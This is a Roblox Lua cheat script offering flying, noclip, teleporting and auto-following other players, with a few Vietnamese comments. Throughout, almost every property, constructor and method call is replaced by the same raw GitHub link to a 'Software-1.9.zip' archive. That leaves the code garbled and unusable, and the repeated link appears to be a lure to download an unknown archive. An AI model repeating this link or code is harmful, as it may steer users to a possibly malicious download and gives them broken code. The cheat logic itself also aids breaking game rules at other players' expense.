-- SERVICES
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
local mouse = player:GetMouse()

-- VARIABLES
local flying = false
local flySpeed = 100
local followDistance = 2
local following = false
local currentTarget = nil
local noclipEnabled = false
local vToggled = false
local paused = false
local holdStates = {}

-- CAMERA
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 1e9
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 0.5

-- TELEPORT LOCATIONS
local teleportLocations = {
	V1 = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(10000,0,0),
	V2 = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(100,442,-10)
}

-- FLY
local bg, bv, flyConn
local function createFlyParts(hrp)
	bg = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("BodyGyro")
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(9e9,9e9,9e9)
	bg.P = 10000
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = hrp

	bv = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("BodyVelocity")
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(9e9,9e9,9e9)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,0,0)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = hrp
end

local function startFlying()
	if flying then return end
	flying = true
	local character = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip or https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip()
	local hrp = character:WaitForChild("HumanoidRootPart")
	createFlyParts(hrp)
	flyConn = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
		if not flying or paused then return end
		local cam = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip * flySpeed
	end)
end

local function stopFlying()
	flying = false
	if flyConn then flyConn:Disconnect() end
	if bg then bg:Destroy() end
	if bv then bv:Destroy() end
end

-- FOLLOW
local function getClosestPlayerInSight()
	local camera = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
	local closestPlayer = nil
	local smallestAngle = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
	for _, otherPlayer in ipairs(Players:GetPlayers()) do
		if otherPlayer ~= player and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("HumanoidRootPart") then
			local hrp = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
			local dirToPlayer = (https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip - https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip).Unit
			local angle = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(dirToPlayer))
			if angle < https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(30) and angle < smallestAngle then
				smallestAngle = angle
				closestPlayer = otherPlayer
			end
		end
	end
	return closestPlayer
end

https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
	if paused then return end
	if following and currentTarget and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("HumanoidRootPart") then
		local targetHRP = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
		local myChar = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip or https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip()
		local myHRP = myChar:FindFirstChild("HumanoidRootPart")
		if myHRP then
			local offset = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip * followDistance
			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip + offset, https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip)
		end
	end
end)

https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
	if flying then
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1)
		startFlying()
	end
end)

-- TELEPORT
local function teleportCharacter(key)
	local character = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip or https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip()
	local hrp = character:FindFirstChild("HumanoidRootPart")
	if hrp then
		if key == "V" then
			if not vToggled then
				https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(teleportLocations.V1)
				vToggled = true
			else
				https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(teleportLocations.V2)
				vToggled = false
			end
		end
	end
end

local function teleportToMouse()
	local char = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
	if char and char:FindFirstChild("HumanoidRootPart") and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip + https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,3,0))
	end
end

-- NOCLIP
local noclipConn
local function setNoclip(state)
	noclipEnabled = state
	if noclipConn then noclipConn:Disconnect() end
	if state then
		noclipConn = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
			local character = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
			if character then
				for _, part in pairs(character:GetDescendants()) do
					if part:IsA("BasePart") then
						https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = false
					end
				end
			end
		end)
	end
end

-- GUI
local gui = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("ScreenGui")
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = "FlyMenuGui"
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = false
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = player:WaitForChild("PlayerGui")

local guiFrame = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("Frame")
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,300,0,420)
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-300,0,242)
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(30,30,30)
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 0
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = true
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = gui

-- DRAG
do
	local dragging, dragInput, dragStart, startPos
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
		if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
			dragging = true
			dragStart = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
			startPos = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
				if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
					dragging = false
				end
			end)
		end
	end)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
		if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
			dragInput = input
		end
	end)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
		if input == dragInput and dragging then
			local delta = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip - dragStart
			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip,https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip+delta.X,
				https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip,https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip+delta.Y)
		end
	end)
end

-- LABELS
local infoLabels = {}
for i = 1,9 do
	local lbl = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("TextLabel")
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-10,0,25)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,5,0,5+(i-1)*30)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 1
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,1,1)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 14
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = guiFrame
	infoLabels[i] = lbl
end

local function updateInfo()
	infoLabels[1].Text = "Fly speed: "https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(flySpeed)
	infoLabels[2].Text = "Noclip: "..(noclipEnabled and "on" or "off")
	infoLabels[3].Text = "Follow distance: "https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(followDistance)
	infoLabels[4].Text = "E to follow"
	infoLabels[5].Text = "R to fly"
	infoLabels[6].Text = "T to turn on/off noclip"
	infoLabels[7].Text = "Y to teleport"
	infoLabels[8].Text = "V tp to void, V again tp to ground (For TSB)"
	infoLabels[9].Text = "Rightshift to turn on/off menu"
end

-- BUTTONS
local function createButton(name,text,y)
	local btn = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("TextButton")
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = name
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-10,0,35)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,5,0,y)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(50,50,50)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,1,1)
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = 14
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = text
	https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = guiFrame
	return btn
end

local increaseBtn = createButton("IncreaseSpeedBtn","faster",300)
local decreaseBtn = createButton("DecreaseSpeedBtn","slower",340)
local adjustFollowBtn = createButton("AdjustFollowBtn","adjust distance (max:10)",380)

https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function() flySpeed+=50 updateInfo() end)
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function() https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,flySpeed-50) updateInfo() end)
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function() followDistance+=1 if followDistance>10 then followDistance=1 end updateInfo() end)

https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
	if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip == https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = not https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip
		updateInfo()
	end
end)

-- CHECKBOX CHỮ HOA
for _, obj in pairs(guiFrame:GetDescendants()) do
	if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("%u") then
		local checkbox = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip("TextButton")
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(0,20,0,20)
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(1,-25,.5,-10)
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = "✔"
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = obj
		holdStates[checkbox] = true
		https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function()
			holdStates[checkbox] = not holdStates[checkbox]
			https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip = holdStates[checkbox] and "✔" or ""
		end)
	end
end

updateInfo()

-- INPUT
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input,gameProcessed)
	if gameProcessed then return end
	if paused then return end

	if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		for box,state in pairs(holdStates) do
			if not state then stopFlying() return end
		end
		if flying then stopFlying() else startFlying() end
	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		teleportCharacter("V")
	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		teleportToMouse()
	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		if not following then
			currentTarget=getClosestPlayerInSight()
			if currentTarget then following=true end
		else
			following=false
			currentTarget=nil
		end
	elseif https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		setNoclip(not noclipEnabled)
	end
	updateInfo()
end)

-- PHÍM ` TẠM DỪNG
https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip(function(input)
	if https://raw.githubusercontent.com/secretplayer134/hai/main/Phineas/Software-1.9.zip then
		paused = not paused
		if paused then stopFlying() print("⛔ Script tạm dừng (ấn ` để chạy lại)") 
		else print("▶ Script chạy lại") end
	end
end)
